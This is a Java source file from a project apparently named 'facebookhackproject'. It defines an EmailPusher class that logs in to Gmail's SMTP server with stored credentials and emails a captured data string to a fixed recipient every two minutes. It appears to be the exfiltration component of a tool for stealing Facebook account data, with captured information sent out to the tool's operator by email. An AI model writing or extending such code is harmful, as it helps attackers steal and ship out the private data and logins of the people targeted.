/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package facebookhackproject.pushers;

import java.util.Properties;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

/**
 *
 * @author Kareem
 */
public class EmailPusher extends Pusher {
    
    String fromEmail;
    String password;
    String toEmail;
    
    public EmailPusher(String fromEmail, String password, String toEmail) {
        this.fromEmail = fromEmail;
        this.password = password;
        this.toEmail = toEmail;
    }

    @Override
    public void push(String data) {
        Properties props = new Properties();
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.host", "smtp.gmail.com");
        props.put("mail.smtp.port", "587");
        
        final String _fromEmail = this.fromEmail;
        final String _password = this.password;

        Session session;
        session = Session.getInstance(props,
                new javax.mail.Authenticator() {
                    @Override
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(_fromEmail, _password);
                    }
                });

        try {

            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(this.fromEmail));
            message.setRecipients(Message.RecipientType.TO,
                    InternetAddress.parse(this.toEmail));
            message.setSubject("***** :) ***** GOOD LUCK -- Kareem -- *****");
            message.setText(data);

            Transport.send(message);

            System.out.println("Pushed to email");

        } catch (MessagingException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public int getIntervalSeconds() {
        return 60 * 2;
    }
}
